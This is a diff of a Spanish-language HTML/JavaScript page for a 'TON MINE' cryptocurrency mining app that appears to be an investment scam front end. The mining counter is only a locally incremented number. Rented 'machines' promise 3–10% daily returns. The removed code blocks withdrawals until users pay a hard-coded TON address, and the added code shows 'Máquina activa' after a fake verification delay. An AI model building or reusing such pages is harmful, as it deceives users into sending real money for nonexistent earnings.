@@ -3,13 +3,22 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Toncoin Mining Pro</title>
+    <title>TON MINE</title>
     <style>
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
             font-family: 'Arial', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+            -webkit-user-select: none;
+            user-select: none;
+            touch-action: manipulation;
+        }
+        
+        html, body {
+            overflow: hidden;
+            height: 100%;
         }
         
         body {
@@ -19,6 +28,8 @@
             display: flex;
             flex-direction: column;
             transition: background-color 0.3s, color 0.3s;
+            position: fixed;
+            width: 100%;
         }
         
         body.light-mode {
@@ -90,16 +101,29 @@
             display: flex;
             flex-direction: column;
             align-items: center;
+            justify-content: center;
             position: relative;
+            width: 100%;
+        }
+        
+        .section-content {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            max-width: 400px;
+            margin: 0 auto;
         }
         
         .counter {
-            font-size: 2.5rem;
+            font-size: 2.8rem;
             font-weight: bold;
-            margin-bottom: 20px;
+            margin-bottom: 25px;
             font-family: 'Courier New', monospace;
             color: #00ff9d;
             text-shadow: 0 0 10px rgba(0, 255, 157, 0.3);
+            text-align: center;
         }
         
         .light-mode .counter {
@@ -109,55 +133,19 @@
         
         /* Animación de minería */
         .mining-animation {
-            width: 150px;
-            height: 150px;
-            margin-bottom: 25px;
+            width: 160px;
+            height: 160px;
+            margin-bottom: 30px;
             position: relative;
             background: url('https://cryptologos.cc/logos/toncoin-ton-logo.png') center/contain no-repeat;
             filter: drop-shadow(0 0 15px rgba(0, 255, 157, 0.5));
-            animation: pulse 2s infinite alternate;
-        }
-        
-        .mining-animation::before {
-            content: "";
-            position: absolute;
-            top: -10px;
-            left: -10px;
-            right: -10px;
-            bottom: -10px;
-            border: 2px solid #00ff9d;
-            border-radius: 50%;
-            animation: rotate 6s linear infinite;
-            opacity: 0.5;
-        }
-        
-        .mining-animation::after {
-            content: "";
-            position: absolute;
-            bottom: -20px;
-            left: 50%;
-            transform: translateX(-50%);
-            width: 80%;
-            height: 10px;
-            background: rgba(0, 255, 157, 0.3);
-            border-radius: 50%;
-            filter: blur(8px);
-            animation: pulseShadow 2s infinite alternate;
+            animation: pulse 3s infinite ease-in-out;
         }
         
         @keyframes pulse {
-            0% { transform: scale(1); filter: drop-shadow(0 0 10px rgba(0, 255, 157, 0.5)); }
-            100% { transform: scale(1.05); filter: drop-shadow(0 0 20px rgba(0, 255, 157, 0.8)); }
-        }
-        
-        @keyframes rotate {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-        
-        @keyframes pulseShadow {
-            0% { width: 80%; opacity: 0.3; }
-            100% { width: 90%; opacity: 0.6; }
+            0% { transform: scale(1); opacity: 0.9; }
+            50% { transform: scale(1.05); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.9; }
         }
         
         /* Botón de minería */
@@ -165,27 +153,18 @@
             background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
             color: white;
             border: none;
-            padding: 15px 40px;
+            padding: 16px 45px;
             border-radius: 30px;
             font-weight: bold;
             font-size: 1.1rem;
             cursor: pointer;
-            margin-bottom: 25px;
+            margin-bottom: 30px;
             box-shadow: 0 4px 20px rgba(0, 255, 157, 0.4);
             transition: all 0.3s;
             text-transform: uppercase;
             letter-spacing: 1px;
-            position: relative;
-            overflow: hidden;
-        }
-        
-        .mining-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 6px 25px rgba(0, 255, 157, 0.6);
-        }
-        
-        .mining-btn:active {
-            transform: translateY(0);
+            width: 100%;
+            max-width: 300px;
         }
         
         .mining-btn:disabled {
@@ -193,7 +172,6 @@
             color: #a0a0a0;
             cursor: not-allowed;
             box-shadow: none;
-            transform: none;
         }
         
         .light-mode .mining-btn:disabled {
@@ -202,7 +180,7 @@
         }
         
         .mining-status {
-            font-size: 1rem;
+            font-size: 1.1rem;
             color: #00ff9d;
             margin-bottom: 30px;
             text-align: center;
@@ -215,53 +193,14 @@
             text-shadow: 0 0 5px rgba(0, 136, 204, 0.3);
         }
         
-        .mining-stats {
-            background: rgba(26, 28, 35, 0.7);
-            padding: 15px;
-            border-radius: 10px;
-            width: 100%;
-            max-width: 300px;
-            margin-bottom: 20px;
-            border: 1px solid rgba(0, 255, 157, 0.2);
-        }
-        
-        .light-mode .mining-stats {
-            background: rgba(224, 224, 224, 0.7);
-            border: 1px solid rgba(0, 136, 204, 0.2);
-        }
-        
-        .stat-row {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 10px;
-        }
-        
-        .stat-row:last-child {
-            margin-bottom: 0;
-        }
-        
-        .stat-label {
-            color: #a0a0a0;
-        }
-        
-        .light-mode .stat-label {
-            color: #666666;
-        }
-        
-        .stat-value {
-            color: #00ff9d;
-            font-weight: bold;
-        }
-        
-        .light-mode .stat-value {
-            color: #0088cc;
-        }
-        
         /* Navigation */
         .navigation {
             display: flex;
             background-color: #1a1c23;
             border-top: 1px solid #2d2f3a;
+            position: fixed;
+            bottom: 0;
+            width: 100%;
         }
         
         .light-mode .navigation {
@@ -271,11 +210,11 @@
         
         .nav-item {
             flex: 1;
-            padding: 15px 0;
+            padding: 16px 0;
             text-align: center;
             color: #a0a0a0;
             text-decoration: none;
-            font-size: 0.8rem;
+            font-size: 0.9rem;
             transition: all 0.3s;
         }
         
@@ -293,12 +232,111 @@
         
         .nav-item i {
             display: block;
-            font-size: 1.5rem;
+            font-size: 1.6rem;
             margin-bottom: 5px;
         }
         
         .hidden {
             display: none;
+        }
+        
+        /* Sección Billetera (aumentada) */
+        .wallet-card {
+            background: rgba(26, 28, 35, 0.8);
+            padding: 25px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 350px;
+            border: 1px solid rgba(0, 255, 157, 0.2);
+            margin-bottom: 20px;
+        }
+        
+        .wallet-row {
+            display: flex;
+            justify-content: space-between;
+            margin-bottom: 18px;
+            font-size: 1.1rem;
+        }
+        
+        .wallet-label {
+            color: #a0a0a0;
+        }
+        
+        .wallet-value {
+            color: #00ff9d;
+            font-weight: bold;
+        }
+        
+        .light-mode .wallet-value {
+            color: #0088cc;
+        }
+        
+        /* Sección Referidos */
+        .referral-card {
+            background: rgba(26, 28, 35, 0.8);
+            padding: 25px;
+            border-radius: 15px;
+            width: 100%;
+            max-width: 350px;
+            border: 1px solid rgba(0, 255, 157, 0.2);
+            text-align: center;
+            font-size: 1.1rem;
+            line-height: 1.5;
+        }
+        
+        /* Sección Máquinas (aumentada) */
+        .machines-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 18px;
+            width: 100%;
+            max-width: 400px;
+            margin-bottom: 80px;
+        }
+        
+        .machine-card {
+            background: rgba(26, 28, 35, 0.8);
+            padding: 18px;
+            border-radius: 12px;
+            text-align: center;
+            border: 1px solid rgba(0, 255, 157, 0.1);
+        }
+        
+        .machine-name {
+            font-size: 1.2rem;
+            margin-bottom: 8px;
+            color: #0088cc;
+            font-weight: bold;
+        }
+        
+        .machine-profit {
+            font-size: 1rem;
+            margin-bottom: 8px;
+            color: #00ff9d;
+        }
+        
+        .machine-price {
+            font-size: 0.95rem;
+            margin-bottom: 12px;
+            color: #a0a0a0;
+        }
+        
+        .machine-btn {
+            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
+            color: white;
+            border: none;
+            padding: 10px;
+            border-radius: 8px;
+            width: 100%;
+            font-size: 0.95rem;
+            cursor: pointer;
+            transition: all 0.2s;
+        }
+        
+        .machine-btn:disabled {
+            background: #2d2f3a;
+            color: #a0a0a0;
+            cursor: not-allowed;
         }
         
         /* Modal styles */
@@ -309,7 +347,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-color: rgba(0, 0, 0, 0.7);
+            background-color: rgba(0, 0, 0, 0.8);
             z-index: 1000;
             justify-content: center;
             align-items: center;
@@ -317,284 +355,53 @@
         
         .modal-content {
             background-color: #1a1c23;
-            padding: 20px;
+            padding: 25px;
             border-radius: 15px;
             width: 90%;
-            max-width: 350px;
+            max-width: 380px;
             border: 1px solid #2d2f3a;
             box-shadow: 0 5px 30px rgba(0, 0, 0, 0.5);
         }
         
-        .light-mode .modal-content {
-            background-color: #ffffff;
-            border: 1px solid #d0d0d0;
-        }
-        
         .modal-title {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             margin-bottom: 20px;
             color: #0088cc;
             text-align: center;
             font-weight: bold;
         }
         
-        .input-group {
-            margin-bottom: 15px;
-        }
-        
-        .input-group label {
-            display: block;
-            margin-bottom: 5px;
-            font-size: 0.9rem;
-        }
-        
-        .light-mode .input-group label {
-            color: #333333;
-        }
-        
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #2d2f3a;
-            background-color: #0f1014;
-            color: white;
-            font-size: 1rem;
-        }
-        
-        .light-mode .input-group input {
-            border: 1px solid #d0d0d0;
-            background-color: #ffffff;
-            color: #333333;
-        }
-        
         .modal-buttons {
             display: flex;
-            gap: 10px;
-            margin-top: 20px;
+            gap: 12px;
+            margin-top: 25px;
         }
         
         .btn {
-            padding: 12px 15px;
+            padding: 12px;
             border-radius: 8px;
             border: none;
             font-weight: bold;
             cursor: pointer;
             flex: 1;
-            transition: all 0.2s;
-        }
-        
-        .btn:hover {
-            transform: translateY(-2px);
-        }
-        
-        .btn:active {
-            transform: translateY(0);
+            font-size: 1rem;
         }
         
         .btn-primary {
             background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
             color: white;
-            box-shadow: 0 2px 10px rgba(0, 255, 157, 0.3);
         }
         
         .btn-secondary {
             background-color: #2d2f3a;
             color: white;
         }
-        
-        .light-mode .btn-secondary {
-            background-color: #d0d0d0;
-            color: #333333;
-        }
-        
-        .error-message {
-            color: #ff5555;
-            font-size: 0.8rem;
-            margin-top: 5px;
-            display: none;
-        }
-        
-        .withdraw-btn {
-            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
-            color: white;
-            border: none;
-            padding: 12px 20px;
-            border-radius: 8px;
-            margin-top: 20px;
-            font-weight: bold;
-            cursor: pointer;
-            width: 100%;
-            max-width: 300px;
-            box-shadow: 0 2px 15px rgba(0, 255, 157, 0.3);
-            transition: all 0.2s;
-        }
-        
-        .withdraw-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 20px rgba(0, 255, 157, 0.4);
-        }
-        
-        /* Machines grid */
-        .machines-grid {
-            display: grid;
-            grid-template-columns: 1fr 1fr;
-            gap: 15px;
-            width: 100%;
-            max-width: 400px;
-        }
-        
-        .machine-card {
-            background: #1a1c23;
-            padding: 15px;
-            border-radius: 10px;
-            text-align: center;
-            border: 1px solid rgba(0, 255, 157, 0.1);
-            transition: all 0.3s;
-        }
-        
-        .machine-card:hover {
-            transform: translateY(-5px);
-            box-shadow: 0 5px 15px rgba(0, 255, 157, 0.2);
-            border-color: rgba(0, 255, 157, 0.3);
-        }
-        
-        .light-mode .machine-card {
-            background: #ffffff;
-            border: 1px solid #d0d0d0;
-        }
-        
-        .machine-name {
-            font-size: 1rem;
-            margin-bottom: 5px;
-            color: #0088cc;
-            font-weight: bold;
-        }
-        
-        .machine-profit {
-            font-size: 0.9rem;
-            margin-bottom: 5px;
-            color: #00ff9d;
-        }
-        
-        .light-mode .machine-profit {
-            color: #0088cc;
-        }
-        
-        .machine-price {
-            font-size: 0.8rem;
-            margin-bottom: 10px;
-            color: #a0a0a0;
-        }
-        
-        .light-mode .machine-price {
-            color: #666666;
-        }
-        
-        .machine-btn {
-            background: linear-gradient(135deg, #00ff9d 0%, #0088cc 100%);
-            color: white;
-            border: none;
-            padding: 10px 12px;
-            border-radius: 8px;
-            width: 100%;
-            font-size: 0.8rem;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        
-        .machine-btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 2px 10px rgba(0, 255, 157, 0.3);
-        }
-        
-        .machine-btn:disabled {
-            background: #2d2f3a;
-            color: #a0a0a0;
-            cursor: not-allowed;
-            transform: none;
-            box-shadow: none;
-        }
-        
-        .light-mode .machine-btn:disabled {
-            background: #d0d0d0;
-            color: #999999;
-        }
-        
-        /* Payment address */
-        .payment-address {
-            background: #2d2f3a;
-            padding: 12px;
-            border-radius: 8px;
-            word-break: break-all;
-            font-size: 0.8rem;
-            margin: 15px 0;
-            text-align: center;
-            cursor: pointer;
-            border: 1px dashed #00ff9d;
-            transition: all 0.2s;
-        }
-        
-        .payment-address:hover {
-            background: #3a3d45;
-        }
-        
-        .light-mode .payment-address {
-            background: #e0e0e0;
-            color: #333333;
-            border: 1px dashed #0088cc;
-        }
-        
-        .copy-message {
-            color: #00ff9d;
-            font-size: 0.7rem;
-            text-align: center;
-            margin-bottom: 10px;
-            display: none;
-        }
-        
-        .light-mode .copy-message {
-            color: #0088cc;
-        }
-        
-        /* Progress bar */
-        .progress-container {
-            width: 100%;
-            max-width: 300px;
-            margin: 15px 0;
-        }
-        
-        .progress-label {
-            display: flex;
-            justify-content: space-between;
-            margin-bottom: 5px;
-            font-size: 0.8rem;
-        }
-        
-        .progress-bar {
-            height: 10px;
-            background-color: #2d2f3a;
-            border-radius: 5px;
-            overflow: hidden;
-        }
-        
-        .light-mode .progress-bar {
-            background-color: #e0e0e0;
-        }
-        
-        .progress {
-            height: 100%;
-            background: linear-gradient(90deg, #00ff9d 0%, #0088cc 100%);
-            border-radius: 5px;
-            width: 0%;
-            transition: width 0.5s ease;
-        }
     </style>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
 </head>
 <body>
     <div class="header">
-        <span>Toncoin Mining Pro</span>
+        <span>TON MINE</span>
         <label class="theme-switch">
             <input type="checkbox" id="theme-toggle">
             <span class="slider"></span>
@@ -603,149 +410,72 @@
     
     <div class="content">
         <!-- Home Section -->
-        <div id="home-section">
+        <div id="home-section" class="section-content">
             <div class="counter" id="ton-counter">0.000000</div>
             <div class="mining-animation"></div>
             <div class="mining-status" id="mining-status">MINERÍA INACTIVA</div>
             <button class="mining-btn" id="mining-btn">COMENZAR MINERÍA GRATIS</button>
-            
-            <div class="progress-container">
-                <div class="progress-label">
-                    <span>Progreso diario</span>
-                    <span id="progress-percent">0%</span>
-                </div>
-                <div class="progress-bar">
-                    <div class="progress" id="daily-progress"></div>
-                </div>
-            </div>
-            
-            <div class="mining-stats">
-                <div class="stat-row">
-                    <span class="stat-label">Velocidad:</span>
-                    <span class="stat-value" id="mining-speed">0.000011 TON/s</span>
-                </div>
-                <div class="stat-row">
-                    <span class="stat-label">Estimado diario:</span>
-                    <span class="stat-value">1.0 TON</span>
-                </div>
-                <div class="stat-row">
-                    <span class="stat-label">Total minado:</span>
-                    <span class="stat-value" id="total-mined">0.0 TON</span>
-                </div>
-            </div>
         </div>
         
         <!-- Wallet Section -->
-        <div id="wallet-section" class="hidden">
-            <h2 style="margin-bottom: 20px;">Tu Billetera</h2>
-            <div style="background: rgba(26, 28, 35, 0.7); padding: 20px; border-radius: 10px; width: 100%; max-width: 300px; border: 1px solid rgba(0, 255, 157, 0.2);">
-                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
-                    <span>Balance:</span>
-                    <span id="wallet-balance">0.000000 TON</span>
+        <div id="wallet-section" class="section-content hidden">
+            <h2 style="margin-bottom: 25px; font-size: 1.5rem;">Tu Billetera</h2>
+            <div class="wallet-card">
+                <div class="wallet-row">
+                    <span class="wallet-label">Balance:</span>
+                    <span class="wallet-value" id="wallet-balance">0.000000 TON</span>
                 </div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 15px;">
-                    <span>Invertido:</span>
-                    <span>0.000000 TON</span>
+                <div class="wallet-row">
+                    <span class="wallet-label">Invertido:</span>
+                    <span class="wallet-value">0.000000 TON</span>
                 </div>
-                <div style="display: flex; justify-content: space-between; margin-bottom: 20px;">
-                    <span>Ganancias:</span>
-                    <span>0.000000 TON</span>
+                <div class="wallet-row">
+                    <span class="wallet-label">Ganancias:</span>
+                    <span class="wallet-value">0.000000 TON</span>
                 </div>
-                <button class="withdraw-btn" id="withdraw-btn">Retirar</button>
+                <button class="mining-btn" id="withdraw-btn" style="margin-top: 15px;">Retirar</button>
             </div>
         </div>
         
         <!-- Referrals Section -->
-        <div id="referrals-section" class="hidden">
-            <h2 style="margin-bottom: 20px;">Programa de Referidos</h2>
-            <div style="background: rgba(26, 28, 35, 0.7); padding: 20px; border-radius: 10px; width: 100%; max-width: 300px; border: 1px solid rgba(0, 255, 157, 0.2);">
-                <div style="margin-bottom: 15px; text-align: center;">
-                    <p>Invita a amigos y gana 5% de sus ganancias</p>
-                </div>
-                <div style="margin-bottom: 15px;">
-                    <p style="font-size: 0.8rem; color: #a0a0a0;">Tu enlace de referido:</p>
-                    <div style="background: #2d2f3a; padding: 10px; border-radius: 5px; word-break: break-all; border: 1px dashed #00ff9d; cursor: pointer;" onclick="copyToClipboard('https://ton.investment/r/12345')">
-                        https://ton.investment/r/12345
-                    </div>
-                </div>
-                <div style="display: flex; justify-content: space-between;">
-                    <span>Referidos:</span>
-                    <span>0</span>
-                </div>
+        <div id="referrals-section" class="section-content hidden">
+            <h2 style="margin-bottom: 25px; font-size: 1.5rem;">Programa de Referidos</h2>
+            <div class="referral-card">
+                Invita a tus amigos a generar ganancias con TON MINE y gana 0.02 USD por cada amigo que se una al proyecto. Para ver tu enlace de referidos dirígete al botón de Amigos en el bot.
             </div>
         </div>
         
         <!-- Machines Section -->
-        <div id="machines-section" class="hidden">
-            <h2 style="margin-bottom: 20px; text-align: center;">Máquinas de Minería</h2>
+        <div id="machines-section" class="section-content hidden">
+            <h2 style="margin-bottom: 25px; font-size: 1.5rem; text-align: center;">Máquinas de Minería</h2>
             <div class="machines-grid">
-                <!-- Máquina Básica -->
                 <div class="machine-card">
                     <div class="machine-name">Básica</div>
                     <div class="machine-profit">3% diario</div>
                     <div class="machine-price">1.0 TON</div>
-                    <button class="machine-btn" id="basic-machine-btn" onclick="showPaymentModal('Básica', 1.0)">Comprar</button>
+                    <button class="machine-btn" id="basic-machine-btn">Comprar</button>
                 </div>
                 
-                <!-- Máquina Normal -->
                 <div class="machine-card">
                     <div class="machine-name">Normal</div>
                     <div class="machine-profit">5% diario</div>
                     <div class="machine-price">1.5 TON</div>
-                    <button class="machine-btn" id="normal-machine-btn" onclick="showPaymentModal('Normal', 1.5)">Comprar</button>
+                    <button class="machine-btn" id="normal-machine-btn">Comprar</button>
                 </div>
                 
-                <!-- Máquina Avanzada -->
                 <div class="machine-card">
                     <div class="machine-name">Avanzada</div>
                     <div class="machine-profit">8% diario</div>
                     <div class="machine-price">2.5 TON</div>
-                    <button class="machine-btn" id="advanced-machine-btn" onclick="showPaymentModal('Avanzada', 2.5)">Comprar</button>
+                    <button class="machine-btn" id="advanced-machine-btn">Comprar</button>
                 </div>
                 
-                <!-- Máquina Premium -->
                 <div class="machine-card">
                     <div class="machine-name">Premium</div>
                     <div class="machine-profit">10% diario</div>
                     <div class="machine-price">3.5 TON</div>
-                    <button class="machine-btn" id="premium-machine-btn" onclick="showPaymentModal('Premium', 3.5)">Comprar</button>
+                    <button class="machine-btn" id="premium-machine-btn">Comprar</button>
                 </div>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Withdraw Modal -->
-    <div class="modal" id="withdraw-modal">
-        <div class="modal-content">
-            <div class="modal-title">Retirar TON</div>
-            
-            <div class="input-group">
-                <label for="withdraw-amount">Cantidad a retirar (mínimo 0.25 TON)</label>
-                <input type="number" id="withdraw-amount" placeholder="0.25" step="0.01" min="0.25">
-                <div class="error-message" id="amount-error">El monto mínimo es 0.25 TON</div>
-            </div>
-            
-            <div class="input-group">
-                <label for="wallet-address">Dirección de tu Wallet TON</label>
-                <input type="text" id="wallet-address" placeholder="EQC...">
-                <div class="error-message" id="address-error">Por favor ingresa una dirección válida</div>
-            </div>
-            
-            <div class="modal-buttons">
-                <button class="btn btn-secondary" id="cancel-withdraw">Cancelar</button>
-                <button class="btn btn-primary" id="confirm-withdraw">Retirar ahora</button>
-            </div>
-        </div>
-    </div>
-    
-    <!-- Machine Required Modal -->
-    <div class="modal" id="machine-modal">
-        <div class="modal-content">
-            <div class="modal-title">Máquina Requerida</div>
-            <p style="margin-bottom: 20px; text-align: center;">Para evitar acciones fraudulentas y automatizadas, debes rentar una máquina de minería para poder realizar retiros.</p>
-            <div class="modal-buttons">
-                <button class="btn btn-secondary" id="close-machine-modal">Entendido</button>
-                <button class="btn btn-primary" id="go-to-machines">Ver Máquinas</button>
             </div>
         </div>
     </div>
@@ -753,29 +483,11 @@
     <!-- Payment Modal -->
     <div class="modal" id="payment-modal">
         <div class="modal-content">
-            <div class="modal-title" id="payment-title">Comprar Máquina</div>
-            
-            <div style="text-align: center; margin-bottom: 15px;">
-                Por favor transfiere <span id="payment-amount" style="font-weight: bold; color: #00ff9d;">0.0</span> TON a la siguiente dirección:
-            </div>
-            
-            <div class="payment-address" id="ton-wallet-address" onclick="copyToClipboard('EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N')">
-                EQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqB2N
-            </div>
-            
-            <div class="copy-message" id="copy-message">
-                ¡Dirección copiada al portapapeles!
-            </div>
-            
-            <div class="input-group">
-                <label for="transaction-hash">Hash de la transacción:</label>
-                <input type="text" id="transaction-hash" placeholder="Ingresa el hash de tu transacción">
-                <div class="error-message" id="hash-error">Por favor ingresa un hash válido</div>
-            </div>
-            
+            <div class="modal-title">Confirmar Pago</div>
+            <p style="text-align: center; margin-bottom: 20px;">¿Has realizado el pago correctamente?</p>
             <div class="modal-buttons">
                 <button class="btn btn-secondary" id="cancel-payment">Cancelar</button>
-                <button class="btn btn-primary" id="confirm-payment">Pago Completado</button>
+                <button class="btn btn-primary" id="confirm-payment">Pago Realizado</button>
             </div>
         </div>
     </div>
@@ -823,9 +535,6 @@
         const miningStatus = document.getElementById('mining-status');
         const counterElement = document.getElementById('ton-counter');
         const walletBalanceElement = document.getElementById('wallet-balance');
-        const totalMinedElement = document.getElementById('total-mined');
-        const progressBar = document.getElementById('daily-progress');
-        const progressPercent = document.getElementById('progress-percent');
         
         let counterValue = parseFloat(localStorage.getItem('tonCounter')) || 0;
         let isMiningActive = localStorage.getItem('miningActive') === 'true';
@@ -838,10 +547,7 @@
             if (isMiningActive) {
                 startMining();
             } else {
-                counterElement.textContent = counterValue.toFixed(6);
-                walletBalanceElement.textContent = counterValue.toFixed(6) + ' TON';
-                totalMinedElement.textContent = counterValue.toFixed(6) + ' TON';
-                updateProgress();
+                updateDisplay();
             }
         }
         
@@ -864,36 +570,21 @@
             counterValue += timePassed * earningsPerSecond;
             
             // Update counter immediately
-            updateCounter();
-            updateProgress();
+            updateDisplay();
             
             // Start the mining interval
             miningInterval = setInterval(() => {
                 counterValue += earningsPerSecond;
-                updateCounter();
-                updateProgress();
+                updateDisplay();
                 localStorage.setItem('tonCounter', counterValue);
                 localStorage.setItem('lastUpdate', Date.now());
             }, 1000);
         }
         
-        function updateCounter() {
+        function updateDisplay() {
             counterElement.textContent = counterValue.toFixed(6);
             walletBalanceElement.textContent = counterValue.toFixed(6) + ' TON';
-            totalMinedElement.textContent = counterValue.toFixed(6) + ' TON';
             lastUpdate = Date.now();
-            localStorage.setItem('tonCounter', counterValue);
-            localStorage.setItem('lastUpdate', lastUpdate);
-        }
-        
-        function updateProgress() {
-            // Calculate progress through the day (0-100%)
-            const now = new Date();
-            const secondsToday = now.getHours() * 3600 + now.getMinutes() * 60 + now.getSeconds();
-            const progress = (secondsToday / 86400) * 100;
-            
-            progressBar.style.width = progress + '%';
-            progressPercent.textContent = Math.round(progress) + '%';
         }
         
         // Initialize on load
@@ -901,7 +592,7 @@
         
         // Navigation functionality
         const navItems = document.querySelectorAll('.nav-item');
-        const sections = document.querySelectorAll('.content > div');
+        const sections = document.querySelectorAll('.section-content');
         
         navItems.forEach(item => {
             item.addEventListener('click', (e) => {
@@ -926,141 +617,47 @@
             });
         });
         
-        // Withdraw functionality
-        const withdrawBtn = document.getElementById('withdraw-btn');
-        const withdrawModal = document.getElementById('withdraw-modal');
-        const cancelWithdraw = document.getElementById('cancel-withdraw');
-        const confirmWithdraw = document.getElementById('confirm-withdraw');
-        const machineModal = document.getElementById('machine-modal');
-        const closeMachineModal = document.getElementById('close-machine-modal');
-        const goToMachines = document.getElementById('go-to-machines');
-        const amountError = document.getElementById('amount-error');
-        const addressError = document.getElementById('address-error');
+        // Machine purchase functionality
+        const machineButtons = [
+            document.getElementById('basic-machine-btn'),
+            document.getElementById('normal-machine-btn'),
+            document.getElementById('advanced-machine-btn'),
+            document.getElementById('premium-machine-btn')
+        ];
         
-        withdrawBtn.addEventListener('click', () => {
-            withdrawModal.style.display = 'flex';
-        });
-        
-        cancelWithdraw.addEventListener('click', () => {
-            withdrawModal.style.display = 'none';
-            amountError.style.display = 'none';
-            addressError.style.display = 'none';
-        });
-        
-        confirmWithdraw.addEventListener('click', () => {
-            const amount = parseFloat(document.getElementById('withdraw-amount').value);
-            const address = document.getElementById('wallet-address').value.trim();
-            
-            // Reset errors
-            amountError.style.display = 'none';
-            addressError.style.display = 'none';
-            
-            // Validate
-            let isValid = true;
-            
-            if (isNaN(amount) || amount < 0.25) {
-                amountError.style.display = 'block';
-                isValid = false;
-            }
-            
-            if (address.length === 0 || !address.startsWith('EQC')) {
-                addressError.style.display = 'block';
-                isValid = false;
-            }
-            
-            if (isValid) {
-                withdrawModal.style.display = 'none';
-                machineModal.style.display = 'flex';
-            }
-        });
-        
-        closeMachineModal.addEventListener('click', () => {
-            machineModal.style.display = 'none';
-        });
-        
-        goToMachines.addEventListener('click', () => {
-            machineModal.style.display = 'none';
-            
-            // Switch to machines section
-            navItems.forEach(navItem => {
-                navItem.classList.remove('active');
-                if (navItem.getAttribute('data-section') === 'machines-section') {
-                    navItem.classList.add('active');
-                }
-            });
-            
-            sections.forEach(section => {
-                section.classList.add('hidden');
-                if (section.id === 'machines-section') {
-                    section.classList.remove('hidden');
-                }
-            });
-        });
-        
-        // Payment functionality
         const paymentModal = document.getElementById('payment-modal');
-        const paymentTitle = document.getElementById('payment-title');
-        const paymentAmount = document.getElementById('payment-amount');
         const cancelPayment = document.getElementById('cancel-payment');
         const confirmPayment = document.getElementById('confirm-payment');
-        const hashError = document.getElementById('hash-error');
-        let currentMachineBtn = null;
+        let currentMachineButton = null;
         
-        function showPaymentModal(machineType, amount) {
-            paymentTitle.textContent = `Comprar Máquina ${machineType}`;
-            paymentAmount.textContent = amount.toFixed(1);
-            paymentModal.style.display = 'flex';
-            
-            // Store
-                      // Store reference to the button that opened this modal
-            currentMachineBtn = document.getElementById(`${machineType.toLowerCase()}-machine-btn`.replace('á', 'a'));
-        }
+        machineButtons.forEach(button => {
+            button.addEventListener('click', () => {
+                paymentModal.style.display = 'flex';
+                currentMachineButton = button;
+            });
+        });
         
         cancelPayment.addEventListener('click', () => {
             paymentModal.style.display = 'none';
-            hashError.style.display = 'none';
-            currentMachineBtn = null;
         });
         
         confirmPayment.addEventListener('click', () => {
-            const txHash = document.getElementById('transaction-hash').value.trim();
-            
-            // Validate transaction hash
-            if (txHash.length === 0) {
-                hashError.style.display = 'block';
-                return;
-            }
-            
-            // Change button text to "Verificando pago"
-            if (currentMachineBtn) {
-                currentMachineBtn.textContent = 'Verificando pago';
-                currentMachineBtn.disabled = true;
-            }
-            
-            // Here you would normally send the hash to your backend for verification
-            // For this example, we'll just show an alert
-            alert(`Pago de ${paymentAmount.textContent} TON recibido para la máquina. Verificaremos la transacción y activaremos tu máquina pronto.`);
-            
             paymentModal.style.display = 'none';
-            document.getElementById('transaction-hash').value = '';
-            hashError.style.display = 'none';
-            currentMachineBtn = null;
+            if (currentMachineButton) {
+                currentMachineButton.textContent = 'Verificando pago...';
+                currentMachineButton.disabled = true;
+                
+                // Simulate verification delay
+                setTimeout(() => {
+                    currentMachineButton.textContent = 'Máquina activa';
+                }, 2000);
+            }
         });
         
-        // Copy to clipboard function
-        function copyToClipboard(text) {
-            const copyMessage = document.getElementById('copy-message');
-            
-            navigator.clipboard.writeText(text).then(() => {
-                copyMessage.style.display = 'block';
-                setTimeout(() => {
-                    copyMessage.style.display = 'none';
-                }, 2000);
-            });
-        }
-
-        // Update progress bar every minute
-        setInterval(updateProgress, 60000);
+        // Prevent scrolling
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        }, { passive: false });
     </script>
 </body>
 </html>
